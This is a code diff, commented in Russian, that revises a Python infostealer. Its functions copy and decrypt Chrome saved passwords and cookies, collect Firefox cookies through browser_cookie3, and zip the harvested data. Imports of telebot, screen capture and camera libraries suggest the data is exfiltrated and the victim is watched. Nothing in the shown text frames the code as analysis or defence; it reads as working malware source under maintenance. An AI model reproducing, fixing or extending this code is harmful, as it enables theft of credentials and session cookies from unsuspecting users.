@@ -8,7 +8,6 @@ import telebot
 import tempfile
 import zipfile
 import random
-import string
 import time
 from datetime import datetime
 from urllib.request import urlopen
@@ -16,7 +15,6 @@ from PIL import ImageGrab
 import browser_cookie3
 import shutil
 import base64
-import subprocess
 import re
 import cv2
 import sys
@@ -385,7 +383,7 @@ def steal_chrome_passwords(browser_name, profile_path):
             return []
         
         # Создаем временную копию файла паролей
-        temp_db = Path(tempfile.gettempdir()) / f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db"
+        temp_db = Path(tempfile.gettempdir()) / f"temp_pass_{browser_name}.db"
         shutil.copy2(str(login_db), str(temp_db))
         
         passwords = []
@@ -407,7 +405,7 @@ def steal_chrome_passwords(browser_name, profile_path):
         
         conn.close()
         try:
-            temp_db.unlink(missing_ok=True)  # Удаляем временный файл
+            os.remove(str(temp_db))  # Удаляем временный файл
         except:
             pass
         return passwords
@@ -425,7 +423,7 @@ def steal_chromium_cookies(browser_name, profile_path):
             return []
         
         # Создаем временную копию файла куки
-        temp_db = Path(tempfile.gettempdir()) / f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db"
+        temp_db = Path(tempfile.gettempdir()) / f"temp_cookie_{browser_name}.db"
         shutil.copy2(str(cookie_db), str(temp_db))
         
         cookies = []
@@ -448,10 +446,7 @@ def steal_chromium_cookies(browser_name, profile_path):
                         try:
                             decrypted_value = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
                         except:
-                            try:
-                                decrypted_value = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8')
-                            except:
-                                decrypted_value = ""
+                            decrypted_value = ""
                     else:
                         # Для старых версий (DPAPI)
                         if platform.system() == "Windows" and HAS_WIN32CRYPT:
@@ -477,7 +472,7 @@ def steal_chromium_cookies(browser_name, profile_path):
         
         conn.close()
         try:
-            temp_db.unlink(missing_ok=True)  # Удаляем временный файл
+            os.remove(str(temp_db))  # Удаляем временный файл
         except:
             pass
         return cookies
@@ -563,20 +558,8 @@ def steal_cookies():
                 if browser_name == "firefox":
                     # Для Firefox используем browser_cookie3
                     try:
-                        firefox_profile = None
-                        if platform.system() == "Windows":
-                            firefox_path = Path(os.getenv('APPDATA')) / 'Mozilla' / 'Firefox' / 'Profiles'
-                            if firefox_path.exists():
-                                for profile in firefox_path.iterdir():
-                                    if profile.is_dir() and '.default' in profile.name:
-                                        firefox_profile = str(profile)
-                                        break
-                        
-                        if firefox_profile:
-                            jar = browser_cookie3.firefox(domain_name='', profile_path=firefox_profile)
-                        else:
-                            jar = browser_cookie3.firefox(domain_name='')
-                        
+                        # Исправление для новой версии browser_cookie3
+                        jar = browser_cookie3.firefox()
                         for cookie in jar:
                             cookies.append({
                                 'host': cookie.domain,
@@ -701,16 +684,11 @@ def create_zip():
     try:
         with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
             # Собираем все файлы и папки
-            all_files = []
             for root, _, files in os.walk(str(BASE_DIR)):
                 for file in files:
                     file_path = Path(root) / file
-                    all_files.append(file_path)
-            
-            # Добавляем все файлы в архив
-            for file_path in all_files:
-                arcname = file_path.relative_to(BASE_DIR)
-                zipf.write(str(file_path), str(arcname))
+                    arcname = file_path.relative_to(BASE_DIR)
+                    zipf.write(str(file_path), str(arcname))
                 
             # Гарантируем включение пустых папок
             empty_folders = [
